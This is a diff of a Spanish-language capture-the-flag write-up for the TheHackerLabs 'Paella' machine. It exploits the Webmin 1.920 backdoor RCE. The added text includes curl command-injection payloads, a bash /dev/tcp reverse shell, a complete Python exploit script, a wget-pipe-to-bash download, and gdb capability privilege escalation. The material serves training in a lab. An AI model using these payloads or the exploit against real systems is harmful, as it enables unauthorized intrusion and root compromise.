@@ -1,11 +1,11 @@
 ---
 layout: single
 title: Paella - TheHackerLabs
-excerpt: "."
-date: 2025-05-21
+excerpt: "Esta fue una máquina sencilla, pero que me complique un poco. Al analizar los escaneos de puertos y servicios, y solamente ver 2 puertos activos, nos dirigimos al puerto 10000 que está ejecutando Webmin 1.920. Investigando un poco, encontramos que esta versión es vulnerable a ejecución remota de código (RCE). Probamos 2 Exploits, uno de Metasploit Framework para ganar acceso a la máquina y otro que comprueba si la versión de Webmin usada, es vulnerable a RCE. Además, se hace un PoC de la vulnerabilidad y se genera un Exploit que automatiza la obtención de una Reverse Shell. Ya dentro de la máquina, usamos linpeas.sh para encontrar algo que nos ayude a escalar privilegios, siendo así que descubrimos que el binario gdb tiene capabilities peligrosas, de las que nos aprovechamos para convertirnos en Root, gracias a la guía de GTFOBins."
+date: 2025-05-22
 classes: wide
 header:
-  teaser: /assets/images/THL-writeup-paella/_logo.png
+  teaser: /assets/images/THL-writeup-paella/paella.jpg
   teaser_home_page: true
   icon: /assets/images/thehackerlabs.jpeg
 categories:
@@ -13,21 +13,37 @@ categories:
   - Easy Machine
 tags:
   - Linux
-  - 
-  - 
+  - Webmin
+  - Remote Code Execution (RCE)
+  - Webmin 1.920 Backdoor
+  - System Recognition (Linux)
+  - Abusing Binary Capabilities
+  - Abusing gdb Binary
+  - Privesc - Abusing gdb Binary
   - OSCP Style
+  - Metasploit Framework
 ---
-![](/assets/images/THL-writeup-paella/_logo.png)
+![](/assets/images/THL-writeup-paella/paella.jpg)
 
-texto
+Esta fue una máquina sencilla, pero que me complique un poco. Al analizar los escaneos de puertos y servicios, y solamente ver 2 puertos activos, nos dirigimos al **puerto 10000** que está ejecutando **Webmin 1.920**. Investigando un poco, encontramos que esta versión es vulnerable a **ejecución remota de código (RCE)**. Probamos 2 Exploits, uno de **Metasploit Framework** para ganar acceso a la máquina y otro que comprueba si la versión de **Webmin** usada, es vulnerable a **RCE**. Además, se hace un **PoC** de la vulnerabilidad y se genera un Exploit que automatiza la obtención de una **Reverse Shell**. Ya dentro de la máquina, usamos **linpeas.sh** para encontrar algo que nos ayude a escalar privilegios, siendo así que descubrimos que el **binario gdb** tiene **capabilities** peligrosas, de las que nos aprovechamos para convertirnos en **Root**, gracias a la **guía de GTFOBins**.
 
 Herramientas utilizadas:
 * *ping*
 * *nmap*
-* **
-* **
-* **
-* **
+* *wappalizer*
+* *whatweb*
+* *searchsploit*
+* *Metasploit Framework (msfconsole)*
+* *Módulo: exploit/linux/http/webmin_backdoor*
+* *python3*
+* *curl*
+* *grep*
+* *tcpdump*
+* *nc*
+* *find*
+* *wget*
+* *linpeas.sh*
+* *gdb*
 
 
 <br>
@@ -43,17 +59,21 @@ Herramientas utilizadas:
 			</ul>
 		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
 			<ul>
-				<li><a href="#"></a></li>
-				<li><a href="#"></a></li>
+				<li><a href="#HTTP">Analizando Servicio HTTP</a></li>
 			</ul>
 		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
 			<ul>
-				<li><a href="#"></a></li>
-				<li><a href="#"></a></li>
+				<li><a href="#Metasploit">Probando Módulo: exploit/linux/http/webmin_backdoor de Metasploit Framework para Webmin 1.920</a></li>
+				<li><a href="#Exploit">Probando Exploit: Webmin 1.920 - Remote Code Execution</a></li>
+				<li><a href="#Exploit2">Desarrollando Exploit Remote Code Execution para Webmin 1.920</a></li>
+				<ul>
+					<li><a href="#RevShell">Obteniendo Reverse Shell Manual con one-liner</a></li>
+					<li><a href="#RevShell2">Obteniendo Reverse Shell con Exploit Hecho en Python</a></li>
+				</ul>
 			</ul>
 		<li><a href="#Post">Post Explotación</a></li>
 			<ul>
-				<li><a href="#"></a></li>
+				<li><a href="#GDB">Enumeración de la Máquina Víctima y Escalando Privilegios con Binario gdb</a></li>
 			</ul>
 		<li><a href="#Links">Links de Investigación</a></li>
 	</ul>
@@ -127,7 +147,7 @@ Nmap done: 1 IP address (1 host up) scanned in 10.74 seconds
 | *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
 | *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |
 
-Hay dos puertos abiertos, pero no había visto antes el uso del puerto 10000.
+Hay dos puertos abiertos, pero no había visto antes el uso del **puerto 10000**.
 
 <br>
 
@@ -163,7 +183,7 @@ Nmap done: 1 IP address (1 host up) scanned in 38.03 seconds
 | *-p*       | Para indicar puertos específicos. |
 | *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |
 
-Parece ser un CMS o algo parecido. Además, tenemos la versión de este servicio, por lo que podemos investigar si hay algún Exploit para esa versión.
+Parece ser un CMS, un software, un servicio o algo parecido. Además, tenemos la versión de este servicio, por lo que podemos investigar si hay algún Exploit para esa versión.
 
 
 <br>
@@ -183,7 +203,9 @@ Entremos:
 <img src="/assets/images/THL-writeup-paella/Captura1.png">
 </p>
 
-Parece que el servicio se llama **Webmin**. Vamos a investigarlo:
+Parece que el servicio se llama **Webmin**.
+
+Vamos a investigarlo:
 
 | **Webmin** |
 |:-----------:|
@@ -234,9 +256,9 @@ Vamos a probar ambos, empezando por el de **Metasploit**.
 <br>
 
 
-<h2 id="Metasploit">Probando Módulo: exploit/linux/http/webmin_backdoor de Metasploit Framework </h2>
+<h2 id="Metasploit">Probando Módulo: exploit/linux/http/webmin_backdoor de Metasploit Framework para Webmin 1.920</h2>
 
-Parece que este Exploit, esta explotando una Backdoor que se dejo de la **versión 1.890 a 1.920** de **Webmin**.
+Parece que este Exploit, está explotando una Backdoor que se dejó de la **versión 1.890 a 1.920** de **Webmin**.
 
 Vamos a buscarlo y a usarlo:
 ```bash
@@ -264,7 +286,7 @@ msf6 exploit(linux/http/webmin_backdoor) > set LHOST Tu_IP
 LHOST => Tu_IP
 ```
 
-Y lo ejecútamos:
+Y lo ejecutamos:
 ```bash
 msf6 exploit(linux/http/webmin_backdoor) > exploit
 [*] Started reverse TCP handler on Tu_IP:4444 
@@ -297,24 +319,24 @@ searchsploit -m linux/webapps/47293.sh
  Verified: False
 File Type: POSIX shell script, ASCII text executable
 ```
-Analicemoslo.
+Analicémoslo.
 
-Parece que este Exploit, es más un checker que verifica si la máquina/servidor que esta usando esta versión de **Webmin** es vulnerable a **Remote Code Execution**.
+Parece que este Exploit, es más un checker que verifica si la máquina/servidor que está usando esta versión de **Webmin** es vulnerable a **Remote Code Execution**.
 
 En caso de que lo sea, va a mostrar **VULNERABLE**:
 ```bash
 ./47293.sh http://192.168.10.50:10000
 Testing for RCE (CVE-2019-15107) on http://192.168.10.50:10000: VULNERABLE!
 ```
-Y si, parece que si es vulnerable.
+Y sí, parece que sí es vulnerable.
 
-Lo que podemos hacer ahora es, analizar este Exploit y la versión de **Metasploit**, con tal de ver como es que se están ejecutando los comandos.
+Lo que podemos hacer ahora es, analizar este Exploit y la versión de **Metasploit**, con tal de ver cómo es que se están ejecutando los comandos.
 
 Quizá podamos desarrollar nuestro propio Exploit.
 
 <br>
 
-<h2 id="Exploit2">Desarrollando Exploit de Remote Code Execution para Webmin 1.920</h2>
+<h2 id="Exploit2">Desarrollando Exploit Remote Code Execution para Webmin 1.920</h2>
 
 Aquí te dejo los Exploit que se usaron y analizamos:
 * <a href="https://www.exploit-db.com/exploits/47293" target="_blank">Exploit-DB: Webmin 1.920 - Remote Code Execution</a>
@@ -325,13 +347,13 @@ Además, aquí esta la explicación de como se encontro y se Exploto esta vulner
 
 <br>
 
-En resumén, 
+En resumén, la opción `user password change` permite la vulnerabilidad de ejecución remota de código, ya que, si un usuario necesita cambiar su contraseña expirada, **password_change.cgi** aplica este cambio, revisando la contraseña vieja. 
 
+Pues resulta que el parámetro `old=` es el que permite esta vulnerabilidad, ya que no realiza ninguna validación de la data enviada, es decir, no revisa si el usuario o la contraseña es correcta.
 
-el parámetro vulnerable es `old=`
+Tan solo hay que agregarle una pipe al final del parámetro `old=` y agregar el comando a ejecutar.
 
-
-Podemos comprobarlo con el siguiente oneliner de curl:
+Podemos comprobarlo con el siguiente one-liner de **curl**, en el que es necesario poner ciertas cabeceras para que funcione (las mismas que ocupan ambos Exploits que ya probamos):
 ```bash
 curl -sk -X POST http://192.168.10.50:10000/password_change.cgi -H "Cookie: redirect=1; testing=1; sid=x; sessiontest=1" -H "Referer: http://192.168.10.50:10000/session_login.cgi" -H "Content-Type: application/x-www-form-urlencoded" --data 'user=berserk&pam=&expired=2&old=berserk|id&new1=berserk&new2=berserk' | grep -A2 '<div class="panel-body">'
 ```
@@ -342,7 +364,7 @@ Ve el resultado:
 <hr>
 <center><h3>Failed to change password : The current password is incorrectuid=1000(paella) gid=1000(paella) groups=1000(paella)
 ```
-Ahí esta, parece que funciona.
+Ahí está, parece que funciona.
 
 Vamos a mandarnos una **traza ICMP** y la capturaremos con **tcpdump**, para saber si es posible una conexión entre la máquina víctima y la nuestra.
 
@@ -353,7 +375,7 @@ tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
 listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
 ```
 
-Y mandamos un ping desde nuestro oneliner:
+Y mandamos un **ping** desde nuestro one-liner:
 ```bash
 curl -sk -X POST http://192.168.10.50:10000/password_change.cgi -H "Cookie: redirect=1; testing=1; sid=x; sessiontest=1" -H "Referer: http://192.168.10.50:10000/session_login.cgi" -H "Content-Type: application/x-www-form-urlencoded" --data 'user=berserk&pam=&expired=2&old=berserk|ping+-c+2+Tu_IP&new1=berserk&new2=berserk' | grep -A2 '<div class="panel-body">'
 ```
@@ -368,7 +390,11 @@ listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
 19:35:17.375134 IP 192.168.10.50 > Tu_IP: ICMP echo request, id 15431, seq 2, length 64
 19:35:17.375155 IP Tu_IP > 192.168.10.50: ICMP echo reply, id 15431, seq 2, length 64
 ```
-Funcionó. Entonces, podemos mandarnos una **Reverse Shell** desde nuestro oneliner.
+Funcionó. Entonces, podemos mandarnos una **Reverse Shell** desde nuestro one-liner.
+
+<br>
+
+<h3 id="RevShell">Obteniendo Reverse Shell Manual con one-liner</h3>
 
 Abre un listener con **netcat**:
 ```bash
@@ -376,7 +402,7 @@ nc -nvlp 443
 listening on [any] 443 ...
 ```
 
-Manda la **Reverse Shell** desde el oneliner:
+Manda la **Reverse Shell** desde el one-liner:
 ```bash
 curl -sk -X POST http://192.168.10.50:10000/password_change.cgi -H "Cookie: redirect=1; testing=1; sid=x; sessiontest=1" -H "Referer: http://192.168.10.50:10000/session_login.cgi" -H "Content-Type: application/x-www-form-urlencoded" --data 'user=berserk&pam=&expired=2&old=berserk|bash+-c+"bash+-i+>%26+/dev/tcp/Tu_IP/443+0>%261"&new1=berserk&new2=berserk' | grep -A2 '<div class="panel-body">'
 ```
@@ -414,6 +440,125 @@ export SHELL=bash
 stty rows 51 columns 189
 ```
 
+<br>
+
+<h3 id="RevShell2">Obteniendo Reverse Shell con Exploit Hecho en Python</h3>
+
+He desarrollado una forma de automatizar la obtención de la **Reverse Shell** con un script de **Python3**.
+
+Lo unico que tienes que hacer es:
+* Activar un listener con `nc -nlvp {puerto_a_usar}`
+* Indicar la URL del webmin, tu IP y el puerto usado del listener
+
+Aquí te dejo el Exploit:
+```python
+#!/usr/bin/env python3
+import requests
+import argparse
+import urllib.parse
+import time
+import urllib3
+from requests.exceptions import ReadTimeout
+
+
+# Desactiva advertencias por SSL
+requests.packages.urllib3.disable_warnings()
+
+
+# Recopilación de argumentos
+def parse_arguments():
+        parser = argparse.ArgumentParser(description="Script para aplicar Reverse Shell a Webmin 1.920 vulnerable")
+        parser.add_argument("-url", required=True, help="URL del Webmin a utilizar, ej: http://10.10.10.10:10000")
+        parser.add_argument("-ip", required=True, help="Tu dirección IP para Reverse Shell")
+        parser.add_argument("-p", type=int, required=True, help="Puerto de escucha a utilizar")
+        return parser.parse_args()
+
+
+# Checando si existe password_change.cgi
+def check_password_change(url_base):
+        url = url_base + '/password_change.cgi'
+        headers = {
+                'Cookie': "redirect=1; testing=1; sid=x; sessiontest=1",
+                'Referer': f"{url_base}/session_login.cgi"
+        }
+        try:
+                response = requests.get(url, headers=headers, verify=False, timeout=5)
+                if response.status_code == 200:
+                        print("[+] El endpoint password_change.cgi está disponible.")
+                        return True
+                else:
+                        print("[-] El endpoint no está disponible o la versión no es vulnerable.")
+                        return False
+        except Exception as e:
+                print(f"[!] Error al conectar con {url}: {e}")
+                return False
+
+
+# Explotando vulnerabilidad de RCE para enviar Reverse Shell
+def exploit(url_base, ip, port):
+        print("[+] Enviando Payload para obtener Reverse Shell")
+
+        url = url_base + '/password_change.cgi'
+        shell = f'bash -c "bash -i >& /dev/tcp/{ip}/{port} 0>&1"'
+        encoded_shell = urllib.parse.quote(shell)
+
+        payload = f'user=berserk&pam=&expired=2&old=berserk|{encoded_shell}&new1=berserk&new2=berserk'
+
+        headers = {
+                'Cookie': "redirect=1; testing=1; sid=x; sessiontest=1",
+                'Referer': "{url_base}/session_login.cgi",
+                'Content-Type': "application/x-www-form-urlencoded"
+        }
+
+        try:
+                requests.post(url, headers=headers, data=payload, verify=False, timeout=5)
+                print("[+] Payload enviado. Si todo está bien, recibirás la reverse shell.")
+        except ReadTimeout:
+                print("[+] Payload enviado. El servidor no respondió (esto es normal si la shell fue exitosa).")
+        except Exception as e:
+                print(f"[!] Falló el envío del payload: {e}")
+
+
+if __name__ == '__main__':
+        args = parse_arguments()
+
+        print(f"[!] Asegúrate de tener el listener activo con: nc -lvnp {args.p}\n")
+        time.sleep(2)
+        vulnerable = check_password_change(args.url)
+        if vulnerable:
+                exploit(args.url, args.ip, args.p)
+        else:
+                print("[!] Webmin no parece ser vulnerable o no se pudo acceder al endpoint.")
+```
+Hagamos una prueba.
+
+Abre el listener con **netcat**:
+```bash
+nc -nvlp 443
+listening on [any] 443 ...
+```
+
+Ejecuta el Exploit:
+```bash
+python3 webminExploit.py -url http://192.168.100.72:10000 -ip 192.168.100.250 -p 443
+[!] Asegúrate de tener el listener activo con: nc -lvnp 443
+
+[+] El endpoint password_change.cgi está disponible.
+[+] Enviando Payload para obtener Reverse Shell
+[+] Payload enviado. El servidor no respondió (esto es normal si la shell fue exitosa).
+```
+
+Observa la **netcat**:
+```bash
+nc -nvlp 443
+listening on [any] 443 ...
+connect to [Tu_IP] from (UNKNOWN) [192.168.10.50] 43108
+bash: cannot set terminal process group (464): Inappropriate ioctl for device
+bash: no job control in this shell
+paella@TheHackersLabs-Paella:/usr/share/webmin/acl$
+```
+Ya solo falta que obtengas una sesión interactiva.
+
 No olvides buscar la flag del usuario:
 ```bash
 paella@TheHackersLabs-Paella:/usr/share/webmin/acl$ cd /home/paella/
@@ -422,11 +567,6 @@ user.txt
 paella@TheHackersLabs-Paella:~$ cat user.txt
 ...
 ```
-
-
-
-
-
 Continuemos.
 
 
@@ -439,7 +579,7 @@ Continuemos.
 <br>
 
 
-<h2 id="GDB">Enumeración de la Máquina Víctima y Escalando Privilegios con Capabilitie SUID en Binario gdb</h2>
+<h2 id="GDB">Enumeración de la Máquina Víctima y Escalando Privilegios con Binario gdb</h2>
 
 Como tal, no podemos ver los privilegios que tiene nuestro usuario, porque no tenemos su contraseña:
 ```bash
@@ -480,7 +620,7 @@ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-Desde la máquina víctima, utilizamos wgte para ejecutar el **linpeas.sh** de manera remota:
+Desde la máquina víctima, utilizamos **wget** para ejecutar el **linpeas.sh** de manera remota:
 ```bash
 paella@TheHackersLabs-Paella:~$ wget -qO- http://Tu_IP/linpeas.sh | bash
 ```
@@ -498,22 +638,24 @@ Files with capabilities (limited to 50):
 ```
 Parece que el **binario gdb** tiene capabilities que podemos aprovechar para escalar privilegios.
 
-EXPLICAR LA CAPABILITIE
+* **cap_setuid**: Esta capability permite al proceso cambiar su propio **UID** (usuario efectivo), como si llamara a la **syscall setuid()** sin restricciones.
+* **Effective (e)**: La capability está activa en tiempo de ejecución.
+* **Permitted (p)**: La capability está permitida.
 
-Podemos investigar en la **guía de GTFOBins**, si es que existe una forma en la que podamos abusar de este binario cuando tenga **capabilities SUID**:
+Podemos investigar en la **guía de GTFOBins**, si es que existe una forma en la que podamos abusar de este binario:
 * <a href="https://gtfobins.github.io/gtfobins/gdb/" target="_blank">GTFOBins: gdb</a>
 
 Ahí está:
 
 <p align="center">
-<img src="/assets/images/THL-writeup-paella/Captura2.png">
+<img src="/assets/images/THL-writeup-paella/Captura3.png">
 </p>
 
-Los comandos indican que debemos asignarle las **capabilities SUID** al binario **gdb**, pero esto ya esta hecho.
+Los comandos indican que debemos asignarle las **capabilities UID** al binario **gdb**, pero esto ya está hecho.
 
 Así que solamente tenemos que usar el último comando, pero necesitamos ejecutarlo desde su ubicación.
 
-Se úbica en el directorio `/bin`, pero en caso de que no este ahí (que sería raro), usemos el comando **which** para saber si existe y donde se encuentra:
+Se ubica en el directorio `/bin`, pero en caso de que no esté ahí (que sería raro), usemos el comando **which** para saber si existe y dónde se encuentra:
 ```bash
 paella@TheHackersLabs-Paella:~$ which gdb
 /bin/gdb
